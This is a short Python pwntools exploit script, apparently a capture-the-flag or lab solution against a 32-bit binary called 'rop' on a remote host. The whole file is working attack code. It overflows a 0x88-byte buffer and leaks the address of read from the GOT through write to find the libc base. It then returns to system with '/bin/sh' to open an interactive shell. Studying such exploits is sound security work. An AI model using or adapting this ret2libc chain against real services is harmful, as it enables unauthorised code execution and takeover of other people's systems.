from pwn import *
elf = ELF('./rop')
libc = ELF('./libc32')
bof = 0x80483f4 
buffer_len = 0x88

context.log_level = 'debug'
p = remote('192.168.10.100',6666)
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' 
payload += p32(elf.symbols['write'])
payload += p32(bof)
payload += p32(1) 
payload += p32(elf.got['read'])
payload += p32(4) 
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']

payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' 
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA' 
payload += p32(libc_base + next(libc.search('/bin/sh')))
p.send(payload)
p.interactive()
